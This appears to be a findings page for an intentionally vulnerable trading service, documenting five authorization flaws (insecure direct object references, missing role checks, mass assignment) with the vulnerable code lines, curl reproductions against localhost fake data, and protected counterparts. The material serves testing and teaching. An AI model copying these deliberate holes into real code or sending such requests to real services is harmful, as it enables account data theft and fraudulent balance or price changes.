# Authorization failures in `trading` (ACCESS-002, 007, 008, 009, 010)

**Family:** `ACCESS` · **Service:** `trading` · **Scanner:** SAST · **OWASP:** A01 · API1, API3, API5

Five operations that answer to a token without settling what the token's holder
may do: another user's object by id (ACCESS-002, ACCESS-008), an administrator's
operation on a user's token (ACCESS-007, ACCESS-009), and a body merged into an
entity as it arrived (ACCESS-010).

Every reproduction below was run on 2026-11-27 against the service alone, on
`127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is
Alice's token. The store was reset to the fake data between reproductions.

## ACCESS-008 — `walletOf`: another user's balances by id

The line (`apps/trading/src/wallets/wallet-of.resolver.ts`):

```ts
// ACCESS-008 / CWE-639: the caller names any user, and the balances answer to the token alone
@Args('userId', { type: () => ID }) userId: string,
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc008.json   # userId "u-erin"
{"data":{"walletOf":[{"asset":"BTC","balance":"0.00000000"},{"asset":"DOGE","balance":"0.00000000"},
 {"asset":"ETH","balance":"0.00000000"},{"asset":"SOL","balance":"0.00000000"},
 {"asset":"USD","balance":"500.00"},{"asset":"XRP","balance":"0.00000000"}]}}
```

Alice gained Erin's six balances, her 500.00 dollars among them.

**Counterpart 1 — `wallet` and `ledger`.** No `userId` argument exists on either:
both answer the caller's own data (Alice's `10000.00`, her one deposit entry).

**Counterpart 2 — `wallets(userId: ID!)`, `@Roles('ADMIN')`.** The identical
payload is refused: `FORBIDDEN`, `"This operation needs one of the roles ADMIN"`.

## ACCESS-002 — `orderDetails`: no ownership check

The line (`apps/trading/src/orders/order-details.resolver.ts`):

```ts
// ACCESS-002 / CWE-639: the order is returned with no check of who placed it
const order = await this.orders.byId(whole);
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc002.json   # id "2"
{"data":{"orderDetails":{"id":"2","userId":"u-bob","memo":"stop loss above entry","limitPrice":"66000.00"}}}
```

Alice gained Bob's order: its id, his note, the price he named.

**Counterpart 1 — `order(id: ID!)`.** The repository answers, then the order is
checked against the caller: `FORBIDDEN`, `"An order is read by the user who
placed it"`.

**Counterpart 2 — `User.orders` through `_entities`.** The reference names a
user the caller did not choose; the field resolver checks it: `FORBIDDEN`.

## ACCESS-009 — `creditWallet`: a user credits a wallet

The line (`apps/trading/src/wallets/credit-wallet.resolver.ts`):

```ts
// ACCESS-009 / CWE-862: the amount is checked, the role is not; a signed-in caller is enough
@Args('userId', { type: () => ID }) userId: string,
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc009.json
# {"userId": "u-alice", "amount": "500.00"}
{"data":{"creditWallet":[...,{"asset":"USD","balance":"10500.00"},...]}}
```

Alice credited herself five hundred dollars on her own token.

**Counterpart 1 — `deposit(userId, amount)`, `@Roles('ADMIN')`.** The identical
payload: `FORBIDDEN`, `"This operation needs one of the roles ADMIN"`.

**Counterpart 2 — `POST /internal/admin/deposits`.** The roles guard refuses the
same body: HTTP `403`.

## ACCESS-010 — `PATCH /internal/orders/:id`: mass assignment

The line (`apps/trading/src/orders/orders-patch.controller.ts`):

```ts
// ACCESS-010 / CWE-915: the body is merged into the entity as it arrived; status and userId are properties of it
Object.assign(order, body);
```

```console
$ curl -s -X PATCH $URL/internal/orders/1 -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"memo":"patched by the scenario","status":"FILLED","userId":"u-bob"}'
{"order":{"id":"1","userId":"u-bob",...,"memo":"patched by the scenario","status":"FILLED",...}}

$ # read back through orderDetails:
{"data":{"orderDetails":{"id":"1","userId":"u-bob","memo":"patched by the scenario","status":"FILLED"}}}
```

Alice's OPEN order became Bob's FILLED order: two writes the route never
offered, from one body.

**Counterpart 1 — `updateOrder(input: UpdateOrderInput!)`.** `UpdateOrderInput`
declares `memo` alone, so the schema itself refuses the payload:
`BAD_USER_INPUT`, `"Variable \"$input\" got invalid value … Field \"status\" is
not defined by type \"UpdateOrderInput\""`.

**Counterpart 2 — `PUT /internal/orders/:id`.** The identical body answers
`200`, and only the memo is written — the field is read by name and nothing else
of the body is read:

```console
$ curl -s -X PUT $URL/internal/orders/1 -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"memo":"patched by the scenario","status":"FILLED","userId":"u-bob"}'
{"order":{"id":"1","userId":"u-alice",...,"memo":"patched by the scenario","status":"OPEN",...}}
```

`OPEN` and `u-alice` stay.

## ACCESS-007 — `setReferencePrice`: a user moves a market

The line (`apps/trading/src/markets/set-reference-price.resolver.ts`):

```ts
// ACCESS-007 / CWE-862: no role check; any signed-in caller moves the price a market fills at
@Args('price', { type: () => DecimalScalar }) price: string,
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc007.json
# {"symbol": "BTC-USD", "price": "1.00"}
{"data":{"setReferencePrice":{"symbol":"BTC-USD","referencePrice":"1.00"}}}

$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @acc007buy.json
# a market buy of 1 BTC, which fills at the reference price
{"data":{"placeOrder":{"id":"11","status":"FILLED","limitPrice":"1.00"}}}

$ curl -s $URL/graphql ... '{ wallet { asset balance } }'
[{"asset":"BTC","balance":"1.00000000"},...,{"asset":"USD","balance":"9999.00"},...]
```

One whole bitcoin for one dollar: the price a market fills at moved on a user's
token, and the buy that followed it paid the price Alice chose.

**Counterpart 1 — `tickPrices`, `@Roles('ADMIN')`.** `FORBIDDEN`, `"This
operation needs one of the roles ADMIN"`.

**Counterpart 2 — `POST /internal/admin/prices/tick`.** The roles guard refuses:
HTTP `403`.

## The tests

`apps/trading/test/scenarios/access.int-spec.ts` — one `describe` per scenario,
one payload per `describe`, sent as written to the vulnerable operation and to
each protected counterpart. The Postman collection `postman/trading/` carries
one request per scenario in its `ACCESS` folder (the PATCH and the two REST
refusals included).

## Scope of the counterparts

Each counterpart claim is scoped: this operation, receiving this payload,
refuses it for this reason. Nothing here says any operation is secure in
general.
